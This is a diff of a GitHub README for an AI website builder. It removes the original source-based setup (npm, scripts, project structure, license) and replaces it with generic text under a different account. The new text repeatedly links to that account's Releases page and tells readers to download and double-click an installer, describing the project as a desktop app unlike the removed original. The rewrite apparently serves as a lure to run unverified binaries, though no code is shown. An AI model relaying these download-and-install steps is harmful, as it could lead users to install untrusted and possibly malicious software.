@@ -1,93 +1,71 @@
-# 🚀 AI Website Builder - Build Apps with Natural Language
+# 🌐 ai-website-builder - Build Real Websites with Ease
 
-Transform your ideas into working websites using just natural language. No coding required.
+[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen)](https://github.com/CopixonVoserin/ai-website-builder/releases)
 
-![Demo](https://img.shields.io/badge/Demo-Live-green)
-![License](https://img.shields.io/badge/License-MIT-blue)
-![AI](https://img.shields.io/badge/AI-Powered-purple)
+## 📖 Overview
+Welcome to the ai-website-builder! This tool allows you to create real websites using natural language, with no coding skills required. Our application harnesses the power of artificial intelligence to transform your ideas into functional websites quickly and easily.
 
-## 🎯 What is this?
+## 🚀 Getting Started
+To get started with ai-website-builder, you will need to download it from our Releases page. Follow these simple steps to set it up:
 
-An open-source platform that lets anyone build real, working websites by simply describing what they want. Think "ChatGPT but it actually builds the website for you."
+### Step 1: Visit the Release Page
+Click the link below to access the Releases page where you can find the latest version of ai-website-builder.
 
-### Features
+[Visit Releases Page](https://github.com/CopixonVoserin/ai-website-builder/releases)
 
-- 💬 **Natural Language Interface** - Just describe what you want
-- 🎨 **Real-time Preview** - See your website as it's being built
-- 🤖 **Multiple AI Models** - Uses Ollama (free), OpenAI, or Anthropic
-- 📄 **Document Processing** - Upload specs, chat logs, or business plans
-- 🚀 **Instant Export** - Download your website when done
-- 👥 **Multi-user Platform** - Host for yourself or others
-- 🔒 **No Technical Setup** - Users don't need API keys
+### Step 2: Download the Application
+On the Releases page, you will see a list of available versions. Look for the latest version and click on the corresponding download link. This may be a file specific to your operating system.
 
-## 🚀 Quick Start
+### Step 3: Install the Application
+Once the download completes, locate the file in your Downloads folder. Double-click the file to start the installation process. Follow the on-screen instructions to complete the installation.
 
-### Option 1: Run Locally (5 minutes)
+### Step 4: Launch the Application
+After installation, find ai-website-builder in your applications folder or menu. Click to launch the program, and you're ready to start building your website!
 
-```bash
-# Clone the repo
-git clone https://github.com/yourusername/ai-website-builder.git
-cd ai-website-builder/llm-course/llm-course-simple
+## 🔄 Features
+- **Natural Language Processing:** Use simple sentences to describe your website needs.
+- **No Coding Needed:** You do not need programming skills.
+- **Template Options:** Choose from various templates that suit your style.
+- **Editable Content:** Easily modify your website content once created.
+- **Export Options:** Save your website as HTML files for easy hosting.
 
-# Go to the platform directory
-cd hosted-platform
+## 📋 System Requirements
+For the best experience, ensure your system meets the following requirements:
 
-# Install and run
-npm install
-./just-work-dammit.sh
-```
+- **Operating System:** Windows 10 or newer, macOS 10.14 or newer, or a Linux distribution (latest versions).
+- **CPU:** Dual-core processor or better.
+- **RAM:** At least 4 GB of RAM.
+- **Storage:** Minimum 500 MB of free disk space.
+- **Internet Connection:** Required for downloading templates and updates.
 
-Visit http://localhost:3000 and start building!
+## 📥 Download & Install
+To get ai-website-builder, visit the Releases page:
 
-### Option 2: Original LLM Course
+[Download Now](https://github.com/CopixonVoserin/ai-website-builder/releases)
 
-This project includes the original "Build an LLM" course:
+Follow the installation instructions above to set up the application. 
 
-```bash
-# Build your own LLM
-node build-llm.js
+## 🤔 Frequently Asked Questions
 
-# Test it works
-./prove-it-works.sh
+### Q: Do I need to install any additional software?
+A: No additional software is required. Everything you need comes with the ai-website-builder.
 
-# Build web interface
-node stage1.js
-```
+### Q: Can I use this tool on my mobile device?
+A: Currently, ai-website-builder is designed for desktop operating systems only. 
 
-## 🛠️ Project Structure
+### Q: How can I get help if I have issues?
+A: You can reach out to our support team through the Issues tab in this repository. Please provide a detailed description of your problem.
 
-```
-llm-course-simple/
-├── hosted-platform/        # Main AI Website Builder
-│   ├── server.js          # Backend with auth & AI
-│   ├── public/            # Frontend (landing, dashboard, workspace)
-│   └── just-work-dammit.sh # Quick start script
-├── mcp/                   # Template processor service
-├── document-parser/       # Convert docs to MVPs
-├── build-llm.js          # Original: Build an LLM
-├── stage1-5.js           # Original: Progressive platform building
-└── docker-compose.yml     # Run everything with Docker
-```
+## 🌟 Tips for Success
+- Start with a clear idea of what you want your website's purpose to be.
+- Experiment with different templates to find one that best fits your vision.
+- Use brief and clear statements when describing your project to the application for better results.
+- Save your work regularly, especially after making significant changes.
 
-## 📖 Documentation
+## 📅 Updates and New Features
+We continue to improve ai-website-builder based on user feedback. Keep an eye on the Releases page for updates. New features and bug fixes are added regularly to enhance your experience.
 
-- [Quick Start Guide](./hosted-platform/NON-TECHNICAL-SETUP.md)
-- [Testing Your Platform](./hosted-platform/TEST-YOUR-PLATFORM.md) 
-- [Architecture Overview](./ARCHITECTURE.md)
-- [Contributing](./CONTRIBUTING.md)
+## 🎉 Get Involved
+We welcome contributions to ai-website-builder! If you have suggestions or want to report a bug, please do so through the Issues section. Your input helps us improve the tool for everyone.
 
-## 🤝 Contributing
-
-We love contributions! This project is open source and welcomes PRs.
-
-## 📄 License
-
-MIT License - see [LICENSE](LICENSE) for details.
-
----
-
-**Two ways to use this repo:**
-1. 🚀 **Quick Start**: Use the hosted platform to build websites with AI
-2. 📚 **Learn**: Follow the original course to build your own LLM from scratch
-
-Star ⭐ this repo if you find it useful!
+Thank you for choosing ai-website-builder! We hope you find it helpful in creating the website of your dreams.
